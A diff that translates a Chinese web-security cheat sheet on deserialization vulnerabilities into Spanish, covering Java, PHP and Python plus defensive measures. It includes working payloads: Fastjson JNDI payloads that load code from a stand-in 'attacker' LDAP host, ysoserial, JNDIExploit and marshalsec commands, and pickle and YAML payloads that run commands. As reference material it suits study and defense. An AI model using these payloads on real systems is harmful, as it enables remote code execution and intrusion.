@@ -1,114 +1,114 @@
-# Web 安全 - 反序列化漏洞
+# Seguridad Web - Vulnerabilidades de deserialización
 
-> 来源: WooYun 漏洞库 | 拆自 web-injection.md
+> Fuente: base de vulnerabilidades WooYun | separado de web-injection.md
 
-## 五、反序列化漏洞
+## V. Vulnerabilidades de deserialización
 
-### 5.1 漏洞本质
-
-```
-序列化数据(不可信) -> 反序列化函数 -> 对象重构触发魔术方法/回调 -> 恶意逻辑执行
-```
-
-**核心公式**：反序列化RCE = 可控序列化输入 + 危险类在classpath/作用域内 + 可达的利用链(Gadget Chain)
-
-### 5.2 Java反序列化
-
-**检测标识**
+### 5.1 Esencia de la vulnerabilidad
 
 ```
-二进制流: AC ED 00 05 (hex头部)
-Base64:   rO0AB (编码后头部)
-常见位置: Cookie、ViewState、JMX、RMI、T3协议、HTTP Body
+Datos serializados (no confiables) -> función de deserialización -> la reconstrucción del objeto dispara métodos mágicos/callbacks -> ejecución de lógica maliciosa
 ```
 
-**利用链速查**
+**Fórmula central**: RCE por deserialización = entrada serializada controlable + clase peligrosa presente en el classpath/ámbito + cadena de explotación alcanzable (Gadget Chain)
 
-| 利用链 | 依赖库 | 触发方式 | 工具 |
+### 5.2 Deserialización en Java
+
+**Indicadores de detección**
+
+```
+Flujo binario: AC ED 00 05 (cabecera hex)
+Base64:   rO0AB (cabecera codificada)
+Ubicaciones comunes: Cookie, ViewState, JMX, RMI, protocolo T3, cuerpo HTTP
+```
+
+**Referencia rápida de cadenas de explotación (Gadget Chains)**
+
+| Cadena de explotación | Librería dependiente | Modo de disparo | Herramienta |
 |--------|--------|----------|------|
 | Commons-Collections | commons-collections 3.x/4.x | InvokerTransformer | ysoserial |
 | Spring | spring-core + spring-beans | MethodInvokeTypeProvider | ysoserial |
-| Fastjson | fastjson < 1.2.68 | `@type` autoType | 手工/专用工具 |
-| Jackson | jackson-databind | 多态反序列化 | ysoserial |
-| JNDI注入 | JDK < 8u191 | LDAP/RMI远程类加载 | JNDIExploit/marshalsec |
+| Fastjson | fastjson < 1.2.68 | `@type` autoType | manual/herramienta dedicada |
+| Jackson | jackson-databind | Deserialización polimórfica | ysoserial |
+| Inyección JNDI | JDK < 8u191 | Carga remota de clases vía LDAP/RMI | JNDIExploit/marshalsec |
 
-**Fastjson经典Payload**
+**Payload clásico de Fastjson**
 
 ```json
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}
 
-// 1.2.47 缓存绕过
+// Bypass de caché en 1.2.47
 {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/","autoCommit":true}}
 ```
 
-**工具链**
+**Cadena de herramientas**
 
 ```bash
-# ysoserial生成payload
+# Generar payload con ysoserial
 java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
 
-# JNDI注入服务
+# Servicio de inyección JNDI
 java -jar JNDIExploit.jar -i attacker_ip
 
-# marshalsec启动恶意LDAP/RMI
+# Iniciar servidor LDAP/RMI malicioso con marshalsec
 java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/#Exploit"
 ```
 
-### 5.3 PHP反序列化
+### 5.3 Deserialización en PHP
 
-**检测标识**
+**Indicadores de detección**
 
 ```
-格式: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
-关键函数: unserialize(), phar://协议触发
+Formato: O:4:"User":2:{s:4:"name";s:5:"admin";s:3:"age";i:25;}
+Función clave: unserialize(), disparo mediante protocolo phar://
 ```
 
-**魔术方法利用链**
+**Cadena de explotación de métodos mágicos**
 
-| 方法 | 触发时机 | 利用方式 |
+| Método | Momento de disparo | Modo de explotación |
 |------|----------|----------|
-| `__wakeup()` | unserialize()调用时 | 属性覆盖→危险操作 |
-| `__destruct()` | 对象销毁时 | 文件删除/写入/命令执行 |
-| `__toString()` | 对象被当字符串使用 | 拼接进危险函数 |
-| `__call()` | 调用不存在的方法 | 链式调用跳板 |
+| `__wakeup()` | Al llamar a unserialize() | Sobrescritura de propiedad→operación peligrosa |
+| `__destruct()` | Al destruirse el objeto | Eliminación/escritura de archivo/ejecución de comandos |
+| `__toString()` | Cuando el objeto se usa como cadena | Concatenación en una función peligrosa |
+| `__call()` | Al llamar a un método inexistente | Trampolín de llamadas encadenadas |
 
-**POP链构造思路**
+**Idea de construcción de cadena POP**
 
 ```
-1. 找入口: __wakeup()/__destruct() 中调用$this->xxx属性的方法
-2. 跳板: 通过__toString()/__call()/__get() 链接到其他类
-3. 终点: 到达system()/eval()/file_put_contents()等危险函数
-4. 构造: 控制属性值使链路完整连通
+1. Encontrar la entrada: método en __wakeup()/__destruct() que invoca una propiedad $this->xxx
+2. Trampolín: enlazar con otras clases mediante __toString()/__call()/__get()
+3. Punto final: llegar a una función peligrosa como system()/eval()/file_put_contents()
+4. Construcción: controlar los valores de las propiedades para que la cadena quede completamente conectada
 ```
 
-**Phar反序列化（无需unserialize调用）**
+**Deserialización Phar (sin necesidad de llamar a unserialize)**
 
 ```php
-// 文件操作函数触发phar://反序列化
+// Las funciones de operación de archivos disparan la deserialización phar://
 file_exists('phar://upload/evil.phar');
-is_dir('phar://upload/evil.jpg');      // 伪装为图片后缀
+is_dir('phar://upload/evil.jpg');      // disfrazado con extensión de imagen
 ```
 
-### 5.4 Python反序列化
+### 5.4 Deserialización en Python
 
-**危险函数**
+**Funciones peligrosas**
 
 ```python
 import pickle, yaml, marshal
 
-# pickle - 最常见
-pickle.loads(data)      # 反序列化
-pickle.load(file)       # 从文件反序列化
+# pickle - la más común
+pickle.loads(data)      # deserializar
+pickle.load(file)       # deserializar desde archivo
 
-# yaml - 需要Loader
-yaml.load(data)         # 默认不安全(旧版本)
-yaml.load(data, Loader=yaml.FullLoader)  # 限制加载
+# yaml - requiere Loader
+yaml.load(data)         # inseguro por defecto (versiones antiguas)
+yaml.load(data, Loader=yaml.FullLoader)  # carga restringida
 
-# marshal - 字节码级别
-marshal.loads(data)     # 加载代码对象
+# marshal - a nivel de bytecode
+marshal.loads(data)     # cargar objeto de código
 ```
 
-**pickle RCE Payload**
+**Payload RCE con pickle**
 
 ```python
 import pickle, os
@@ -118,22 +118,22 @@ class Exploit:
         return (os.system, ('whoami',))
 
 payload = pickle.dumps(Exploit())
-# 等价手工构造:
+# Construcción manual equivalente:
 # pickle.loads(b"cos\nsystem\n(S'whoami'\ntR.")
 ```
 
-**yaml RCE Payload**
+**Payload RCE con yaml**
 
 ```yaml
 !!python/object/apply:os.system ['whoami']
-# 或
+# o
 !!python/object/new:subprocess.check_output [['whoami']]
 ```
 
-### 5.5 防御措施
+### 5.5 Medidas de defensa
 
 ```java
-// Java: ObjectInputStream白名单过滤
+// Java: filtrado por lista blanca en ObjectInputStream
 ObjectInputStream ois = new ObjectInputStream(input) {
     @Override protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
         if (!allowedClasses.contains(desc.getName())) throw new InvalidClassException("Blocked: " + desc.getName());
@@ -142,10 +142,9 @@ ObjectInputStream ois = new ObjectInputStream(input) {
 };
 ```
 
-- **Java**: 升级组件(Fastjson/Jackson/Commons-Collections)、关闭autoType、使用白名单反序列化过滤器
-- **PHP**: 避免unserialize()处理用户输入、使用json_decode替代、禁用phar://协议
-- **Python**: 使用`yaml.safe_load()`替代`yaml.load()`、禁止pickle处理不可信数据、使用JSON
-- **通用**: 避免原生序列化格式传输数据，统一使用JSON；对反序列化入口做签名/HMAC校验
+- **Java**: actualizar componentes (Fastjson/Jackson/Commons-Collections), deshabilitar autoType, usar un filtro de deserialización con lista blanca
+- **PHP**: evitar que unserialize() procese entrada del usuario, usar json_decode como alternativa, deshabilitar el protocolo phar://
+- **Python**: usar `yaml.safe_load()` en lugar de `yaml.load()`, prohibir que pickle procese datos no confiables, usar JSON
+- **General**: evitar transmitir datos en formatos de serialización nativos, unificar el uso de JSON; aplicar verificación de firma/HMAC en los puntos de entrada de deserialización
 
 ---
-
